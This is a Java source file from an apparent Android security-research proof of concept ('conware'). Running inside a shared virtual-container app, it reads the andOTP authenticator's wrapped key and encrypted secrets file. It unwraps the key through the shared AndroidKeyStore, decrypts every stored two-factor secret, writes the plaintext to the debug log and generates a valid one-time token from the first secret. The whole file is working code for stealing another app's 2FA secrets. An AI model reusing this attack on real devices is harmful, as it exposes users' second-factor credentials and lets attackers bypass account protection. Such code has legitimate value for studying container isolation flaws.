package com.container.conware;

import android.content.Context;
import android.util.Log;

import com.container.conbeer.ConBeer;
import com.container.conbeer.ContainerRecon;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import org.apache.commons.codec.binary.Base32;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.nio.ByteBuffer;
import java.nio.charset.StandardCharsets;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.KeyStore;
import java.security.KeyStoreException;
import java.security.NoSuchAlgorithmException;
import java.security.UnrecoverableEntryException;
import java.security.cert.CertificateException;
import java.text.NumberFormat;
import java.util.Arrays;
import java.util.Locale;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.Mac;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.SecretKey;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

/***
 * Contains code for AndOTP. https://github.com/andOTP/andOTP
 *
 * AndOTP generates a keypair using the keystore, and then encrypting a symmetric key using the
 * the above generated private key to store the backup on the device.
 *
 * There are other ways to backup the data in AndOTP as well, using Keystore is one of the ways.
 */

public class AndOTP {

    Context mContext;
    static String KEYSTORE_ALIAS_WRAPPING = "settings";
    ConBeer mConBeer;

    public AndOTP(Context context) {
        this.mContext = context;
        this.mConBeer = new ConBeer(this.mContext, null);
    }

    // 1. Get the key -> need the alias name
    // 2. Get the backup file
    // 3. Find the encrypted symmetric key
    // 4. Decrypt data and find something interesting to show in the demo, maybe parse the data
    //      and run your own TOTP?


    public enum HashAlgorithm {
        SHA1, SHA256, SHA512
    }


    public String decryptBackup(){
        try {
            SecretKey encKey;

            final KeyStore keyStore = KeyStore.getInstance("AndroidKeyStore");
            keyStore.load(null);

            // get appdir
            String containerAppDir = new ContainerRecon(this.mContext).getContainerAppDir();
            String aesKeyFileStr = containerAppDir + "org.shadowice.flocke.andotp/files/otp.key";
            File aesKeyFile = new File(aesKeyFileStr);

            String encFileStr = containerAppDir + "org.shadowice.flocke.andotp/files/secrets.dat";
            File encFile = new File(encFileStr);

            // read keyfile
            final byte[] wrapper = this.readFileToBytes(aesKeyFile);

            KeyStore.PrivateKeyEntry entry = (KeyStore.PrivateKeyEntry) keyStore.getEntry(this.KEYSTORE_ALIAS_WRAPPING, null);

            Cipher cipher = Cipher.getInstance("RSA/ECB/PKCS1Padding");
            cipher.init(Cipher.UNWRAP_MODE, entry.getPrivateKey());

            encKey = (SecretKey) cipher.unwrap(wrapper, "AES", Cipher.SECRET_KEY);

            final byte[] cipherText = this.readFileToBytes(encFile);

            byte[] iv = Arrays.copyOfRange(cipherText, 0, 12);
            byte[] encrypted = Arrays.copyOfRange(cipherText, 12, cipherText.length);

            Cipher aesCipher = Cipher.getInstance("AES/GCM/NoPadding");
            aesCipher.init(Cipher.DECRYPT_MODE, encKey, new IvParameterSpec(iv));

            byte[] plainText = aesCipher.doFinal(encrypted);
            String decryptedString = new String(plainText, StandardCharsets.UTF_8);

            Log.d("ANDOTP", decryptedString);

            JSONArray json = new JSONArray(decryptedString);
            JSONObject jsonObj = json.getJSONObject(0);
            byte[] secret = new Base32().decode(jsonObj.getString("secret").toUpperCase());
            //long counter = jsonObj.getLong("counter");
            long counter = jsonObj.getLong("counter");
            int digits = jsonObj.getInt("digits");
            HashAlgorithm hashAlgo = HashAlgorithm.valueOf(jsonObj.getString("algorithm"));

            String token = HOTP(secret, counter, digits, hashAlgo);
            Log.d("ANDOTP","Token: " + token);
            return token;

        }catch(KeyStoreException | NoSuchAlgorithmException | CertificateException| IOException |
                NoSuchPaddingException  | InvalidKeyException | UnrecoverableEntryException |
                BadPaddingException | IllegalBlockSizeException |
                InvalidAlgorithmParameterException | JSONException e){
            e.printStackTrace();
            return "";
        }
    }


    public static String formatTokenString(int token, int digits) {
        NumberFormat numberFormat = NumberFormat.getInstance(Locale.ENGLISH);
        numberFormat.setMinimumIntegerDigits(digits);
        numberFormat.setGroupingUsed(false);

        return numberFormat.format(token);
    }

    public static String HOTP(byte[] secret, long counter, int digits, HashAlgorithm algorithm) {
        int fullToken = HOTP(secret, counter, algorithm);
        int div = (int) Math.pow(10, digits);

        return formatTokenString(fullToken % div, digits);
    }

    private static byte[] generateHash(HashAlgorithm algorithm, byte[] key, byte[] data)
            throws NoSuchAlgorithmException, InvalidKeyException {
        String algo = "Hmac" + algorithm.toString();

        Mac mac = Mac.getInstance(algo);
        mac.init(new SecretKeySpec(key, algo));

        return mac.doFinal(data);
    }

    private static int HOTP(byte[] key, long counter, HashAlgorithm algorithm)
    {
        int r = 0;

        try {
            byte[] data = ByteBuffer.allocate(8).putLong(counter).array();
            byte[] hash = generateHash(algorithm, key, data);

            int offset = hash[hash.length - 1] & 0xF;

            int binary = (hash[offset] & 0x7F) << 0x18;
            binary |= (hash[offset + 1] & 0xFF) << 0x10;
            binary |= (hash[offset + 2] & 0xFF) << 0x08;
            binary |= (hash[offset + 3] & 0xFF);

            r = binary;
        } catch (Exception e) {
            e.printStackTrace();
        }

        return r;
    }

    static byte[] readFileToBytes(File file) throws IOException {
        final InputStream in = new FileInputStream(file);
        try {
            ByteArrayOutputStream bytes = new ByteArrayOutputStream();
            byte[] buffer = new byte[1024];
            int count;
            while ((count = in.read(buffer)) != -1) {
                bytes.write(buffer, 0, count);
            }
            return bytes.toByteArray();
        } finally {
            in.close();
        }
    }

    static void writeBytesToFile(File file, byte[] data) throws IOException {
        try (OutputStream out = new FileOutputStream(file)) {
            out.write(data);
        }
    }
}

